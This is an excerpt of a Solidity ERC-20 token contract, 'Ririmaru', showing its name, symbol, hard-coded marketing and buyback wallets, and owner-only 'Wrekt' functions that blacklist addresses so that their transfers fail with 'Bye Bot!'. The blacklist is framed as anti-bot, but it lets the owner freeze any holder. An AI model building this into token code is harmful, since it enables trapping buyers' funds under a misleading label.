...
contract Ririmaru is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ririmaru";
    string private _symbol = "RIRI"; 
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x90cAb3Bf3d20Cc2BEA127FEF59515112f67A8455); 
    address payable public buybackWalletAddress = payable(0x90cAb3Bf3d20Cc2BEA127FEF59515112f67A8455); 
    ...
    function SingleWrekt(address account, bool True_False) public onlyOwner {
        Wrekt[account] = True_False;
    }

    function MultiWrekt(address[] memory account, bool True_False) public onlyOwner {
        for(uint256 i = 0; i < account.length; i++){
            address wallet = account[i];
            Wrekt[wallet] = True_False;
        }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        require(!Wrekt[recipient] && !Wrekt[sender], "Bye Bot!");
